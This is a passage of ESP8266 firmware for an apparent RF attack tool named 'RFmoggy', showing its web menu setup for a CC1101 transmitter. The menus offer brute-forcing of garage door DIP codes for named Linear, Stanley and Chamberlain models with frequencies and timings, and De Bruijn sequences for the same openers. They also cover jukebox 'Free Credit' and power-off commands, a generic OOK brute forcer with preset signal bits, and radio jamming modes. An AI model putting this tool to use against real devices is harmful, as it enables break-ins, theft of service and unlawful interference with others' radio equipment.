  server.on("/rfpwnon", handleRfpwnonMenu);
  server.on("/noise", handleNoiseMenu);
  server.on("/widenoise", handleWideNoiseMenu);
  server.on("/cwavenoise", handleCwaveNoiseMenu);
  
  server.on("/sendjukebox", handleJukeboxSend);
  server.on("/sendgarage", handleGarageSend);
  server.on("/senddebruijn", handleDebruijnSend);
  server.on("/sendrfpwnon", handleRfpwnonSend);
  server.on("/sendnoise", handleNoiseSend);
  server.on("/sendwidenoise", handleWideNoiseSend);
  server.on("/sendcwavenoise", handleCwaveNoiseSend);
  server.onNotFound(handle_NotFound);
 
  server.begin();                  //Start server
  Serial.println("HTTP server started");  

  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, HIGH);

  menu_htmlHeader = "<!DOCTYPE html> <html>";
  menu_htmlHeader += "<head><meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, user-scalable=no\">";
  menu_htmlHeader += "<style>html { font-family: Helvetica; display: inline-block; margin: 0px auto; text-align: center;} ";
  menu_htmlHeader += "body{margin-top: 10px;} h1 {color: #000000;margin: 20px auto 30px;} h3 {color: #000000;margin-bottom: 50px;} ";
  menu_htmlHeader += "p {font-size: 16px;color: #000000;margin-bottom: 30px;} ";
  menu_htmlHeader += "button { background-color: #008CBA; border: none; color: white; padding: 12px 28px; text-align: center; text-decoration: none; display: inline-block; font-size: 16px;} ";
  menu_htmlHeader += "</style></head>";
  
  main_menu += menu_htmlHeader;
  main_menu += "<title>RFmoggy Main Menu</title>";
  main_menu += "<body><h1>RFmoggy</h1>";
  main_menu += "<h3>NodeMCU ESP8266 CC1101 Sub-1GHz OOK Transmitter</h3>";
  main_menu += "<p><a href=\"jukebox\">Touchtunes Jukebox Remote</a></p>";
  main_menu += "<p><a href=\"garage\">Garage Door DIP Switch BruteForce</a></p>";
  main_menu += "<p><a href=\"debruijn\">Garage Door DIP De Bruijn</a></p>";
  main_menu += "<p><a href=\"rfpwnon\">Rfpwnon Brute Force</a></p>";
  main_menu += "<p><a href=\"noise\">Noise</a></p>";
  main_menu += "<p><a href=\"widenoise\">Wide Noise</a></p>";
  main_menu += "<p><a href=\"cwavenoise\">CW Noise</a></p>";
  main_menu += "<br><br>Warning: No error checks for inputs. Your responsibility to verify inputs are valid (e.g. MHz ranges)";
  main_menu += "</body></html>";

  jukebox_menu += menu_htmlHeader;
  jukebox_menu += "<title>Jukebox Remote Control</title>";
  jukebox_menu += "<body><center><h1>Touchtunes Jukebox Remote Control</h1>";
  jukebox_menu += "<h3>Most jukeboxes use default Jukebox ID, no brute force needed</h3>";
  jukebox_menu += "<form action=\"sendjukebox\">";
  jukebox_menu += "<button name=\"remotebutton\" type=\"submit\" value=\"freeCredit\">Free Credit</button></a><br><br>";
  jukebox_menu += "<button name=\"remotebutton\" type=\"submit\" value=\"pauseSong\">Pause Song</button></a><br><br>";
  jukebox_menu += "<button name=\"remotebutton\" type=\"submit\" value=\"skipSong\">Skip Song</button></a><br><br>";
  jukebox_menu += "<button name=\"remotebutton\" type=\"submit\" value=\"volumeUp\">Volume Up</button></a><br><br>";
  jukebox_menu += "<button name=\"remotebutton\" type=\"submit\" value=\"volumeDown\">Volume Down</button></a><br><br>";
  jukebox_menu += "<button name=\"remotebutton\" type=\"submit\" value=\"powerOff\">Power Off</button></a><br><br>";
  jukebox_menu += "<button name=\"remotebutton\" type=\"submit\" value=\"lockQueue\">Lock Queue</button></a><br><br>";
  jukebox_menu += "<input type=\"checkbox\" name=\"brutejuke\" value=\"true\">Brute Force Jukebox ID - takes appox 4min max<br><br>";
  jukebox_menu += "<label>Repeat signal X times  </label><input type=\"text\" name=\"jukeboxRepeat\" size=\"5\" value=\"3\">";
  jukebox_menu += "</form><p><a href=\"/\">Return to Main Menu</a></p></body></html>";

  garage_menu += menu_htmlHeader;
  garage_menu += "<title>Garage DIP BruteForce</title>";
  garage_menu += "<body><h1>Garage Door DIP Switch Brute Force</h1>";
  garage_menu += "<form action=\"sendgarage\">";
  garage_menu += "<p><input type=\"checkbox\" name=\"linear10\" value=\"true\">Linear Multicode 10DIP 300MHz - 12min max</p>";
  garage_menu += "<p><input type=\"checkbox\" name=\"stanley10\" value=\"true\">Stanley Multicode 10DIP 310MHz - 12min max</p>";
  garage_menu += "<p><input type=\"checkbox\" name=\"chamber9\" value=\"true\">Chamberlain 9DIP 390Mhz - 4min max (binary, not ternary)</p>";
  garage_menu += "<p><input type=\"checkbox\" name=\"chamber8\" value=\"true\">Chamberlain 8DIP 390MHz - 3min max</p>";
  garage_menu += "<p><input type=\"checkbox\" name=\"linear8\" value=\"true\">Linear MooreMatic 8DIP 310MHz- 3min max</p>";
  garage_menu += "<p><input type=\"checkbox\" name=\"chamber7\" value=\"true\">Chamberlain 7DIP 390MHz - 2min max</p>";
  garage_menu += "<p><input type=\"submit\" value=\"Submit\"></p>";
  garage_menu += "</form><p><a href=\"/\">Return to Main Menu</a></p></body></html>";

  debruijn_menu += menu_htmlHeader;
  debruijn_menu += "<title>Garage DeBruijn</title>";
  debruijn_menu += "<body><h1>Garage Door DIP De Bruijn Sequences</h1>";
  debruijn_menu += "<form action=\"senddebruijn\">";
  debruijn_menu += "<input type=\"checkbox\" name=\"linearDebruijn\" value=\"true\">Linear Multicode 10DIP 300MHz - 1033 length sequence<br><br>";
  debruijn_menu += "<input type=\"checkbox\" name=\"stanleyDebruijn\" value=\"true\">Stanley Multicode 10DIP 310MHz - 1033 length sequence<br><br>";
  debruijn_menu += "<input type=\"checkbox\" name=\"chamberDebruijn\" value=\"true\">Chamberlain 7,8,9DIP 390Mhz - 520 length (doesn't attempt ternary bits)<br><br>";
  debruijn_menu += "<input type=\"checkbox\" name=\"mooreDebruijn\" value=\"true\">Linear MooreMatic 8DIP 310MHz- 263 length sequence<br><br>";
  debruijn_menu += "<p><label>Repeat Signal(0=send once) </label><input type=\"text\" name=\"deBruijnRepeat\" size=\"3\" value=\"0\"></p>";
  debruijn_menu += "<p><input type=\"submit\" value=\"Submit\"></p>";
  debruijn_menu += "</form><p><a href=\"/\">Return to Main Menu</a></p></body></html>";
  
  rfpwnon_menu += menu_htmlHeader;
  rfpwnon_menu += "<title>RfPwnOn</title>";
  rfpwnon_menu += "<body><h1>RfPwnOn OOK Brute Force Hacker</h1>";
  rfpwnon_menu += "<h3>Example will brute force jukebox poweroff signal</h3>";
  rfpwnon_menu += "<form action=\"sendrfpwnon\">";
  rfpwnon_menu += "<p><label>Freq MHz </label><input type=\"text\" name=\"pwnMHz\" size=\"10\" value=\"433.92\"></p>";
  rfpwnon_menu += "<p><label>Baud(kBPS) </label><input type=\"text\" name=\"pwnBaud\" size=\"10\" value=\"1.7777\"></p>";
  rfpwnon_menu += "<p><label>Binary(DIP) Size to Brute </label><input type=\"text\" name=\"pwnDipSize\" size=\"3\" value=\"8\"></p>";
  rfpwnon_menu += "<p><label>Repeat Signal(0=send once) </label><input type=\"text\" name=\"pwnRepeat\" size=\"3\" value=\"3\"></p>";
  rfpwnon_menu += "<p><label>Gap between repeats(ms) </label><input type=\"text\" name=\"pwnGapWidth\" size=\"5\" value=\"50\"></p>";
  rfpwnon_menu += "<p><label>Delay between next combination/attempt(ms) </label><input type=\"text\" name=\"pwnAttemptWait\" size=\"5\" value=\"500\"></p>";
  rfpwnon_menu += "<p><label>PWM Binary for 0 </label><input type=\"text\" name=\"pwnZeroPwm\" size=\"10\" value=\"10\"></p><br>";
  rfpwnon_menu += "<p><label>PWM Binary for 1 </label><input type=\"text\" name=\"pwnOnePwm\" size=\"10\" value=\"1000\"></p><br>";
  rfpwnon_menu += "<p><label>Prefix bits, add to beginning of signal</label></p>";
  rfpwnon_menu += "<input type =\"text\" name=\"pwnPrefix\" size=\"60\" value=\"11111111111111110000000010100010100010001000101000\"><br>";
  rfpwnon_menu += "<input type=\"checkbox\" name=\"pwnConvertPrefix\" value=\"true\">Convert Prefix Binary to PWM bits<br>";
  rfpwnon_menu += "<p><label>Postfix bits, add to end of signal</label></p>";
  rfpwnon_menu += "<input type =\"text\" name=\"pwnPostfix\" size=\"60\" value=\"0111100010000111\"><br>";
  rfpwnon_menu += "<input type=\"checkbox\" name=\"pwnConvertPostfix\" value=\"true\" checked=\"checked\">Convert Postfix Binary to PWM bits<br>";
  rfpwnon_menu += "<p><input type=\"submit\" value=\"Submit\"></p>";
  rfpwnon_menu += "</form><p><a href=\"/\">Return to Main Menu</a></p></body></html>";

  noise_menu += menu_htmlHeader;
  noise_menu += "<title>Noise</title>";
  noise_menu += "<body><h1>Noise</h1>";
  noise_menu += "<h3>Simple Noise</h3>";
  noise_menu += "<h3>Transmits stream of 0xFF bytes<h3>";
  //noise_menu += "<p>Creates continuous data packets(50bytes) full of \"1\", \"ON\", 0xFF bytes at 2kbps</p>";
  noise_menu += "<form action=\"sendnoise\">";
  noise_menu += "<p><label>Noise Freq MHz </label><input type=\"text\" name=\"noiseMHz\" size=\"10\" value=\"315.0\"></p>";
  noise_menu += "<p><label>Noise Baud </label><input type=\"text\" name=\"noiseRate\" size=\"10\" value=\"4.8\"></p>";
  noise_menu += "<p><label>Noise Modulation </label><input type=\"text\" name=\"noiseModu\" size=\"10\" value=\"2\"><br>";
  noise_menu += "0=2-FSK 1=GFSK 2=ASK 3=4-FSK 4=MSK</p>";
  noise_menu += "<p><label>Noise FreqDeviation </label><input type=\"text\" name=\"noiseDevn\" size=\"10\" value=\"1.8\"></p>";
  noise_menu += "<p><label>Seconds of Noisy </label><input type=\"text\" name=\"noiseTime\" size=\"10\" value=\"30\"></p>";
  noise_menu += "<p><input type=\"submit\" value=\"Submit\"></p>";
  noise_menu += "</form><p><a href=\"/\">Return to Main Menu</a></p></body></html>";

  widenoise_menu += menu_htmlHeader;
  widenoise_menu += "<title>Wide Noise</title>";
  widenoise_menu += "<body><h1>Wide Noise</h1>";
  widenoise_menu += "<h3>Wide Noise</h3>";
  widenoise_menu += "<h3>Transmits square wave. Arduino tone() function. Generates phase noise, spurs, harmonics<h3>";
  widenoise_menu += "<form action=\"sendwidenoise\">";
  widenoise_menu += "<p><label>Noise Freq MHz </label><input type=\"text\" name=\"widenoiseMHz\" size=\"10\" value=\"859.7875\"></p>";
  widenoise_menu += "<p><label>Noise ToneHz (Hz: min 32Hz, max 65kHz) </label><input type=\"text\" name=\"widenoiseBandwidth\" size=\"10\" value=\"1200\"></p>";
  widenoise_menu += "<p><label>Noise Duration (milliseconds) </label><input type=\"text\" name=\"widenoiseDuration\" size=\"10\" value=\"30000\"><br>";
  widenoise_menu += "<p><input type=\"submit\" value=\"Submit\"></p>";
  widenoise_menu += "</form><p><a href=\"/\">Return to Main Menu</a></p></body></html>";

  cwavenoise_menu += menu_htmlHeader;
  cwavenoise_menu += "<title>CW Noise</title>";
  cwavenoise_menu += "<body><h1>CW Noise</h1>";
  cwavenoise_menu += "<h3>CW Noise</h3>";
  cwavenoise_menu += "<h3>Transmits continuous wave signal, narrowband noise<h3>";
  cwavenoise_menu += "<form action=\"sendcwavenoise\">";
  cwavenoise_menu += "<p><label>Noise Freq MHz </label><input type=\"text\" name=\"cwavenoiseMHz\" size=\"10\" value=\"315.0\"></p>";
  cwavenoise_menu += "<p><label>Noise Duration (milliseconds) </label><input type=\"text\" name=\"cwavenoiseDuration\" size=\"10\" value=\"30000\"><br>";
  cwavenoise_menu += "<p><input type=\"submit\" value=\"Submit\"></p>";
  
  cwavenoise_menu += "</form><p><a href=\"/\">Return to Main Menu</a></p></body></html>";

}


void loop(void){
  server.handleClient();          //Handle client requests
  //cc1101_debug.debug();
}
